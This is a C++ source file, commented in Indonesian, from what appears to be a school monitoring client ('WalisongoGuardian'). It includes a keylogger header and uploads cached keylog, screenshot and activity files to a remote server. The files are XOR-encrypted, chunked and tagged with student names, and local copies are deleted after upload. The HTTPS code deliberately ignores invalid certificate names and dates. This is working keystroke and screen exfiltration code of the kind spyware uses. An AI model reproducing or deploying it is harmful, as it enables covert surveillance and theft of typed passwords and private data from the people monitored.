#include "transmission.h"
#include "config.h"
#include "globals.h"
#include "utils.h"
#include "encryption.h"
#include "network_gate.h"
#include "keylogger.h"
#include <wininet.h>
#include <iostream>
#include <fstream>
#include <chrono>
#include <thread>
#include <algorithm>
#include <filesystem>
#include <mutex>
#include <cstring>
#include <cmath>

#pragma comment(lib, "wininet.lib")

// ====== NETWORK CONFIGURATION & STATE MANAGEMENT ======
namespace NetworkConfig {
    // Mutex global khusus untuk melindungi akses ke Config::DYNAMIC_SERVER_URL
    static std::mutex g_urlMtx;
    
    // Circuit breaker state untuk mencegah retry storm
    struct CircuitBreakerState {
        int failureCount = 0;
        int maxFailures = 5;
        std::chrono::system_clock::time_point lastFailureTime = std::chrono::system_clock::now();
        bool isOpen = false;
        int resetTimeoutSec = 300; // 5 menit
    };
    static CircuitBreakerState g_circuitBreaker;
    
    // Retry configuration dengan exponential backoff
    struct RetryConfig {
        int maxRetries = 3;
        int initialDelayMs = 500;
        int maxDelayMs = 30000;
        double backoffMultiplier = 2.0;
    };
    static RetryConfig g_retryConfig;
    
    // DWORD timeout configuration (lebih flexible)
    static DWORD g_connectTimeoutMs = 15000;   // 15 detik
    static DWORD g_sendTimeoutMs = 20000;      // 20 detik
    static DWORD g_receiveTimeoutMs = 20000;   // 20 detik
    
    // Max payload size untuk single request (50MB)
    static const size_t MAX_SINGLE_PAYLOAD = 50 * 1024 * 1024;
}

/**
 * Validasi URL secara ketat
 * - Harus dimulai dengan http:// atau https://
 * - Harus memiliki host yang valid
 * - Harus URL-encoded dengan proper
 */
bool ValidateURL(const std::string& url) {
    if (url.empty() || url.length() > 4096) return false;
    
    // Check protocol
    if (url.find("http://") != 0 && url.find("https://") != 0) return false;
    
    // Check for valid host characters (basic validation)
    size_t schemeEnd = url.find("://");
    if (schemeEnd == std::string::npos) return false;
    
    size_t hostStart = schemeEnd + 3;
    size_t hostEnd = url.find_first_of("/:?#", hostStart);
    if (hostEnd == std::string::npos) hostEnd = url.length();
    
    std::string host = url.substr(hostStart, hostEnd - hostStart);
    if (host.empty() || host.length() > 255) return false;
    
    // Host harus berisi dot dan tidak boleh berisi whitespace atau karakter invalid
    if (host.find(" ") != std::string::npos || 
        host.find("\n") != std::string::npos ||
        host.find("\r") != std::string::npos ||
        host.find("\t") != std::string::npos) {
        return false;
    }
    
    return true;
}

/**
 * Hitung delay dengan exponential backoff
 * retry 0 -> 500ms, retry 1 -> 1000ms, retry 2 -> 2000ms, etc.
 */
DWORD CalculateBackoffDelay(int retryAttempt) {
    if (retryAttempt < 0) retryAttempt = 0;
    
    double delay = NetworkConfig::g_retryConfig.initialDelayMs * 
                   std::pow(NetworkConfig::g_retryConfig.backoffMultiplier, retryAttempt);
    
    delay = std::min(delay, (double)NetworkConfig::g_retryConfig.maxDelayMs);
    
    return (DWORD)delay;
}

/**
 * Check dan update circuit breaker state
 */
bool IsCircuitBreakerOpen() {
    auto now = std::chrono::system_clock::now();
    auto timeSinceLastFailure = std::chrono::duration_cast<std::chrono::seconds>(
        now - NetworkConfig::g_circuitBreaker.lastFailureTime).count();
    
    // Jika sudah melewati reset timeout, reset circuit breaker
    if (NetworkConfig::g_circuitBreaker.isOpen && 
        timeSinceLastFailure > NetworkConfig::g_circuitBreaker.resetTimeoutSec) {
        NetworkConfig::g_circuitBreaker.isOpen = false;
        NetworkConfig::g_circuitBreaker.failureCount = 0;
        #ifdef _DEBUG
        std::cerr << "[INFO] Circuit breaker reset setelah timeout" << std::endl;
        #endif
    }
    
    return NetworkConfig::g_circuitBreaker.isOpen;
}

/**
 * Record failure untuk circuit breaker
 */
void RecordNetworkFailure() {
    NetworkConfig::g_circuitBreaker.failureCount++;
    NetworkConfig::g_circuitBreaker.lastFailureTime = std::chrono::system_clock::now();
    
    if (NetworkConfig::g_circuitBreaker.failureCount >= NetworkConfig::g_circuitBreaker.maxFailures) {
        NetworkConfig::g_circuitBreaker.isOpen = true;
        #ifdef _DEBUG
        std::cerr << "[WARN] Circuit breaker OPEN - terlalu banyak failure (" 
                  << NetworkConfig::g_circuitBreaker.failureCount << ")" << std::endl;
        #endif
    }
}

/**
 * Clear failures (ketika berhasil)
 */
void ClearNetworkFailures() {
    NetworkConfig::g_circuitBreaker.failureCount = 0;
    NetworkConfig::g_circuitBreaker.isOpen = false;
}

/**
 * Fungsi pembantu untuk mengecek apakah server tujuan dapat dijangkau.
 */
bool IsServerOnline() {
    DWORD dwFlags;
    // Cek status koneksi dasar Windows
    if (!InternetGetConnectedState(&dwFlags, 0)) return false;

    // Jika URL kosong atau circuit breaker open, anggap offline
    {
        std::lock_guard<std::mutex> lock(NetworkConfig::g_urlMtx);
        if (Config::DYNAMIC_SERVER_URL.empty()) return false;
        if (IsCircuitBreakerOpen()) {
            #ifdef _DEBUG
            std::cerr << "[INFO] Server offline (circuit breaker open)" << std::endl;
            #endif
            return false;
        }
    }
    
    return true;
}

/**
 * Helper untuk cleanup HINTERNET handles dengan safe check
 */
void SafeInternetCloseHandle(HINTERNET& hHandle) {
    if (hHandle != NULL) {
        InternetCloseHandle(hHandle);
        hHandle = NULL;
    }
}

/**
 * Parameter overrideUrl: Jika diisi, fungsi akan mengirim data ke URL tersebut.
 * Jika kosong, fungsi akan mengambil dari Config::DYNAMIC_SERVER_URL.
 * Dengan retry logic dan exponential backoff
 */
bool PostDataChunked(const std::vector<BYTE>& chunk, std::string type, std::string fname, 
                     std::string fileID, int chunkNum, int chunkTotal, std::string overrideUrl) {
    
    // Validasi input
    if (chunk.empty() || type.empty() || fileID.empty()) {
        #ifdef _DEBUG
        std::cerr << "[ERROR] PostDataChunked: Invalid parameters" << std::endl;
        #endif
        return false;
    }
    
    if (chunk.size() > NetworkConfig::MAX_SINGLE_PAYLOAD) {
        #ifdef _DEBUG
        std::cerr << "[ERROR] Chunk terlalu besar: " << chunk.size() << " bytes" << std::endl;
        #endif
        return false;
    }
    
    // Check circuit breaker sebelum mencoba
    if (IsCircuitBreakerOpen()) {
        #ifdef _DEBUG
        std::cerr << "[ERROR] Circuit breaker OPEN - tidak mengirim data" << std::endl;
        #endif
        RecordNetworkFailure();
        return false;
    }

    std::string finalUrl;
    {
        std::lock_guard<std::mutex> lock(NetworkConfig::g_urlMtx);
        finalUrl = overrideUrl.empty() ? Config::DYNAMIC_SERVER_URL : overrideUrl;
    }

    if (finalUrl.empty() || !ValidateURL(finalUrl)) {
        #ifdef _DEBUG
        std::cerr << "[ERROR] Server URL kosong atau invalid!" << std::endl;
        #endif
        RecordNetworkFailure();
        return false; 
    }
    
    // Retry loop dengan exponential backoff
    int retryAttempt = 0;
    while (retryAttempt <= NetworkConfig::g_retryConfig.maxRetries) {
        HINTERNET hInt = NULL;
        HINTERNET hConn = NULL;
        HINTERNET hReq = NULL;
        bool success = false;
        
        try {
            hInt = InternetOpenA("WalisongoGuardian/1.5", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
            if (!hInt) throw std::runtime_error("InternetOpen failed");

            // Parse URL dengan proper buffer
            URL_COMPONENTSA url = { sizeof(url) };
            char host[1024] = {0}, path[4096] = {0};
            url.lpszHostName = host;
            url.dwHostNameLength = sizeof(host) - 1;
            url.lpszUrlPath = path;
            url.dwUrlPathLength = sizeof(path) - 1;

            if (!InternetCrackUrlA(finalUrl.c_str(), 0, 0, &url)) {
                throw std::runtime_error("InternetCrackUrl failed");
            }

            // Validate parsed components
            if (std::strlen(host) == 0 || std::strlen(path) == 0) {
                throw std::runtime_error("Invalid URL components after parsing");
            }

            INTERNET_PORT port = (url.nScheme == INTERNET_SCHEME_HTTPS) ? 443 : url.nPort;
            if (port == 0) port = (url.nScheme == INTERNET_SCHEME_HTTPS) ? 443 : 80;
            
            // HTTP flags dengan security baseline yang reasonable
            DWORD httpFlags = INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE;
            if (url.nScheme == INTERNET_SCHEME_HTTPS) {
                httpFlags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
            }

            hConn = InternetConnectA(hInt, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
            if (!hConn) throw std::runtime_error("InternetConnect failed");

            hReq = HttpOpenRequestA(hConn, "POST", path, NULL, NULL, NULL, httpFlags, 0);
            if (!hReq) throw std::runtime_error("HttpOpenRequest failed");

            // Set timeouts (lebih reasonable)
            if (!InternetSetOptionA(hReq, INTERNET_OPTION_CONNECT_TIMEOUT, 
                                    &NetworkConfig::g_connectTimeoutMs, sizeof(DWORD))) {
                #ifdef _DEBUG
                std::cerr << "[WARN] Failed to set connect timeout" << std::endl;
                #endif
            }
            if (!InternetSetOptionA(hReq, INTERNET_OPTION_SEND_TIMEOUT, 
                                    &NetworkConfig::g_sendTimeoutMs, sizeof(DWORD))) {
                #ifdef _DEBUG
                std::cerr << "[WARN] Failed to set send timeout" << std::endl;
                #endif
            }
            if (!InternetSetOptionA(hReq, INTERNET_OPTION_RECEIVE_TIMEOUT, 
                                    &NetworkConfig::g_receiveTimeoutMs, sizeof(DWORD))) {
                #ifdef _DEBUG
                std::cerr << "[WARN] Failed to set receive timeout" << std::endl;
                #endif
            }

            // Clean headers dari karakter invalid
            auto CleanHeader = [](std::string s) {
                // Limit panjang untuk header values
                if (s.length() > 1024) s = s.substr(0, 1024);
                s.erase(std::remove(s.begin(), s.end(), '\n'), s.end());
                s.erase(std::remove(s.begin(), s.end(), '\r'), s.end());
                s.erase(std::remove_if(s.begin(), s.end(), [](unsigned char c) { return c > 127; }), s.end());
                return s;
            };

            std::string safeFname = CleanHeader(fname);
            std::string safeUser = CleanHeader(STUDENT_NAME);
            std::string safeClass = CleanHeader(STUDENT_CLASS);

            std::string headers = "X-API-Key: " + Config::RAW_API_KEY + "\r\n" +
                                  "X-Client-Version: " + Config::CLIENT_VERSION + "\r\n" +
                                  "X-ID: " + SYSTEM_ID + "\r\n" +
                                  "X-User: " + safeUser + " [" + safeClass + "]\r\n" +
                                  "X-Type: " + type + "\r\n" +
                                  "X-Filename: " + safeFname + "\r\n" +
                                  "X-File-ID: " + fileID + "\r\n" +
                                  "X-Chunk-Num: " + std::to_string(chunkNum) + "\r\n" +
                                  "X-Chunk-Total: " + std::to_string(chunkTotal) + "\r\n" +
                                  "Content-Type: application/octet-stream\r\n";

            // Limit header size
            if (headers.length() > 8192) {
                throw std::runtime_error("Headers too large");
            }

            BOOL res = HttpSendRequestA(hReq, headers.c_str(), (DWORD)headers.length(), 
                                        (LPVOID)chunk.data(), (DWORD)chunk.size());
            
            if (!res) throw std::runtime_error("HttpSendRequest failed with error: " + std::to_string(GetLastError()));
            
            DWORD dwStatusCode = 0;
            DWORD dwSize = sizeof(dwStatusCode);
            if (!HttpQueryInfoA(hReq, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, 
                               &dwStatusCode, &dwSize, NULL)) {
                throw std::runtime_error("HttpQueryInfo failed");
            }

            #ifdef _DEBUG
            std::cout << "[SEND] Host: " << host << " | Path: " << path 
                      << " | Status: " << dwStatusCode << " | Retry: " << retryAttempt << std::endl;
            #endif
            
            if (dwStatusCode == 200) {
                success = true;
            } else {
                throw std::runtime_error("HTTP Status " + std::to_string(dwStatusCode));
            }
            
        } catch (const std::exception& e) {
            #ifdef _DEBUG
            std::cerr << "[ERROR] PostDataChunked exception: " << e.what() 
                      << " (Attempt: " << (retryAttempt + 1) << ")" << std::endl;
            #endif
            success = false;
        }
        
        // Cleanup handles
        SafeInternetCloseHandle(hReq);
        SafeInternetCloseHandle(hConn);
        SafeInternetCloseHandle(hInt);
        
        if (success) {
            ClearNetworkFailures();
            return true;
        }
        
        // Jika gagal, check apakah perlu retry
        retryAttempt++;
        if (retryAttempt <= NetworkConfig::g_retryConfig.maxRetries) {
            DWORD delayMs = CalculateBackoffDelay(retryAttempt - 1);
            #ifdef _DEBUG
            std::cerr << "[INFO] Retry " << retryAttempt << " in " << delayMs << "ms..." << std::endl;
            #endif
            std::this_thread::sleep_for(std::chrono::milliseconds(delayMs));
        }
    }
    
    // Semua retry habis
    RecordNetworkFailure();
    return false;
}

void ProcessOfflineQueue() {
    // Check server online dan circuit breaker
    if (!IsServerOnline()) {
        #ifdef _DEBUG
        std::cerr << "[INFO] Server tidak online - skip ProcessOfflineQueue" << std::endl;
        #endif
        return;
    }

    std::vector<std::string> types = {"activity", "keylog", "screenshot"};
    
    for (auto& t : types) {
        std::filesystem::path p = GetCache(t);
        if (!std::filesystem::exists(p)) continue;

        std::error_code ec;
        for (auto& entry : std::filesystem::directory_iterator(p, ec)) {
            if (ec) {
                #ifdef _DEBUG
                std::cerr << "[WARN] Directory iteration error: " << ec.message() << std::endl;
                #endif
                break;
            }

            // Check online status per file
            if (!IsServerOnline()) {
                #ifdef _DEBUG
                std::cerr << "[INFO] Server connection lost - stopping queue processing" << std::endl;
                #endif
                return;
            }

            std::ifstream f(entry.path(), std::ios::binary | std::ios::ate);
            if (!f.is_open()) {
                #ifdef _DEBUG
                std::cerr << "[WARN] Cannot open file: " << entry.path() << std::endl;
                #endif
                continue;
            }
            
            std::streamsize size = f.tellg();
            if (size <= 0) { 
                f.close(); 
                std::filesystem::remove(entry.path(), ec);
                continue;
            }
            
            // Jangan process file yang terlalu besar
            if (size > NetworkConfig::MAX_SINGLE_PAYLOAD) {
                f.close();
                #ifdef _DEBUG
                std::cerr << "[WARN] File too large, skipping: " << entry.path().filename() 
                          << " (" << size << " bytes)" << std::endl;
                #endif
                continue;
            }
            
            f.seekg(0, std::ios::beg);
            
            std::vector<BYTE> buf(static_cast<size_t>(size));
            if (!f.read(reinterpret_cast<char*>(buf.data()), size)) {
                f.close();
                #ifdef _DEBUG
                std::cerr << "[ERROR] Failed to read file: " << entry.path() << std::endl;
                #endif
                continue;
            }
            f.close();

            // Enkripsi sebelum dikirim
            try {
                XORData(buf);
                FinalEncryption(buf);
            } catch (const std::exception& e) {
                #ifdef _DEBUG
                std::cerr << "[ERROR] Encryption failed: " << e.what() << std::endl;
                #endif
                continue;
            }

            // Generate unique fileID
            std::string fileID = std::to_string(time(NULL)) + "_" + GetRandomSuffix(6);
            
            size_t totalChunks = (buf.size() + Config::CHUNK_SIZE - 1) / Config::CHUNK_SIZE;
            bool successAll = true;

            for (size_t i = 0; i < totalChunks; i++) {
                // Check online sebelum kirim chunk
                if (!IsServerOnline()) {
                    #ifdef _DEBUG
                    std::cerr << "[INFO] Connection lost during chunk upload" << std::endl;
                    #endif
                    return;
                }

                size_t start = i * Config::CHUNK_SIZE;
                size_t length = std::min(Config::CHUNK_SIZE, buf.size() - start);
                
                std::vector<BYTE> chunk(buf.begin() + start, buf.begin() + start + length);

                if (!PostDataChunked(chunk, t, entry.path().filename().string(), fileID, (int)i, (int)totalChunks)) {
                    successAll = false;
                    #ifdef _DEBUG
                    std::cerr << "[ERROR] Chunk " << i << " failed for file: " 
                              << entry.path().filename() << std::endl;
                    #endif
                    break; 
                }
                
                // Jeda pendek antar chunk
                std::this_thread::sleep_for(std::chrono::milliseconds(150));
            }

            if (successAll) {
                // File berhasil dikirim, hapus dari cache
                std::error_code removeEc;
                if (std::filesystem::remove(entry.path(), removeEc)) {
                    #ifdef _DEBUG
                    std::cout << "[OK] File uploaded and removed: " << entry.path().filename() << std::endl;
                    #endif
                } else {
                    #ifdef _DEBUG
                    std::cerr << "[WARN] Failed to remove file: " << entry.path() << std::endl;
                    #endif
                }
            } else {
                // Jika gagal, stop dan tunggu jadwal berikutnya
                #ifdef _DEBUG
                std::cerr << "[INFO] Upload failed, will retry next cycle" << std::endl;
                #endif
                return; 
            }
        }
    }
}